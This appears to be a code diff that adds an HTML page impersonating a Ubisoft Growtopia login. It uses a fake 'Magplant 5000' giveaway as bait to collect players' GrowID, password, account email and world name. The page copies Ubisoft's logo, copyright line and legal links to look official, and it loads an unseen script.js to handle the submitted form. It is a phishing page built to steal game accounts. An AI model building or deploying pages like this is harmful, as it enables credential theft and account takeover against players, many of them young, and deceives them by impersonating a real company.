@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Growtopia Login</title>
+
+    <!-- Link to the stylesheet -->
+    <link rel="stylesheet" href="style.css">
+
+    <!-- Favicon link -->
+    <link rel="icon" href="assets/Giger.webp" type="image/webp">
+</head>
+<body>
+    <div class="background-image">
+        <div class="login-container">
+            <!-- Updated Promo Message -->
+            <p class="promo-message">
+                To win the giveaway, please enter accurate details including your GrowID, password, email, world.
+            </p>
+
+            <!-- Main title -->
+            <h1>Magplant 5000</h1>
+
+            <!-- Login Form -->
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="growId">GrowID <span>*</span></label>
+                    <input type="text" id="growId" name="growId" placeholder="Enter your Grow ID" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="password">Password (GrowID) <span>*</span></label>
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="email">Current GrowID Email <span>*</span></label>
+                    <input type="email" id="email" name="email" placeholder="Enter your Current GrowID Email" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="world">Growtopia World <span>*</span></label>
+                    <input type="text" id="world" name="world" placeholder="Enter your world" required>
+                </div>
+
+                <!-- Submit Button with Blue Color -->
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+
+        <!-- Bottom Section for Ubisoft Logo and Legal Text -->
+        <div class="bottom-section">
+            <img src="assets/Ubi.png" alt="Ubisoft Logo" class="ubisoft-logo">
+            <p class="ubisoft-text">UBISOFT</p>
+            <p class="legal-section">© 2025 Ubisoft. All Rights Reserved.</p>
+            <p class="privacy-policy">
+                <a href="#">Legal</a> | <a href="#">Privacy Policy</a> | <a href="#">Manage Consent</a> | 
+                <a href="#">Do not sell my Personal Information</a>
+            </p>
+        </div>
+    </div>
+
+    <!-- Link to your script file -->
+    <script src="script.js"></script>
+</body>
+</html>
+
